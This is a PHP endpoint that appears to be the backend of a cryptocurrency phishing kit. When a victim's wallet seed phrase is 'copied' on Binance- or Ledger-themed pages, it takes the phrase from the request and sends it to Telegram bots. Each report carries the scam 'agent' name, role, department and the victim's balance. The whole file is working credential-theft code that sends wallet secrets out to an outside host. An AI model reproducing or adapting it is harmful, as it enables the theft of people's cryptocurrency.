<?php
header('Content-Type: application/json');
require_once 'functions.php';

// Set CORS headers if needed (update with your actual domain in production)
header('Access-Control-Allow-Origin: *');
// header("Access-Control-Allow-Origin: http://localhost:3000");

header('Access-Control-Allow-Methods: GET, POST');
header('Access-Control-Allow-Headers: Content-Type');


// Handle preflight requests
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

// Function to validate token against reference
function validateToken($reference, $token)
{
    // Token should be base64 encoding of the reference
    $expectedToken = base64_encode($reference);
    return hash_equals($expectedToken, $token);
}


// Get request parameters
$reference = isset($_GET['reference']) ? trim($_GET['reference']) : '';
$token = isset($_GET['token']) ? trim($_GET['token']) : '';
$action = isset($_GET['action']) ? trim($_GET['action']) : '';
$seed = isset($_GET['seed']) ? trim($_GET['seed']) : '';
$siteref = isset($_GET['siteref']) ? trim($_GET['siteref']) : '';

// Validate input
if (empty($reference) || empty($token)) {
    echo json_encode([
        'success' => false,
        'error' => 'Missing required parameters (reference and token)'
    ]);
    exit;
}
// Validate token
if (!validateToken($reference, $token)) {
    echo json_encode([
        'success' => false,
        'error' => 'Invalid token'
    ]);
    exit;
}
$referenceData = getReferenceTracking($reference);

if ($action == 'copied' && $siteref != 'ledger') {

    $jsonData = [
        'Activity' => 'Seed Phrase copied',
        'Department' => $referenceData['department'] ?? 'Unknown',
        'Agent' => $referenceData['agent_name'] . ' (' . $referenceData['role'] . ')',
        'Balance' => $referenceData['balance']
    ];

    sendDataToTelegramBot($jsonData);

    if ($seed) {
        $jsonData['Activity'] = 'Binance';
        $jsonData['Seed Phrase'] = $seed;
        sendDataToTelegramBot($jsonData, TELEGRAM_ADMIN_BOT_URL);
    }
} else if ($action == 'copied' && $siteref == 'ledger') {

    $jsonData = [
        'Activity' => 'Ledger page filled',
        'Department' => $referenceData['department'] ?? 'Unknown',
        'Agent' => $referenceData['agent_name'] . ' (' . $referenceData['role'] . ')',
        'Balance' => $referenceData['balance']
    ];

    sendDataToTelegramBot($jsonData, TELEGRAM_ADMIN_BOT_URL);

    if ($seed) {
        $jsonData['Activity'] = 'Ledger';
        $jsonData['Seed Phrase'] = $seed;
        sendDataToTelegramBot($jsonData, TELEGRAM_ADMIN_BOT_URL);
    }

}



// Prepare response
$response = [
    'success' => true,
    'data' => [
        'reference' => $referenceData ?: null,
        'seed' => $seed ?: null,
    ]
];

// If no specific reference found but token is valid, still return ausers
if (!$referenceData) {
    $response['message'] = 'Reference not found, but token is valid';
    $response['success'] = false;
}

// Return JSON response
echo json_encode($response);
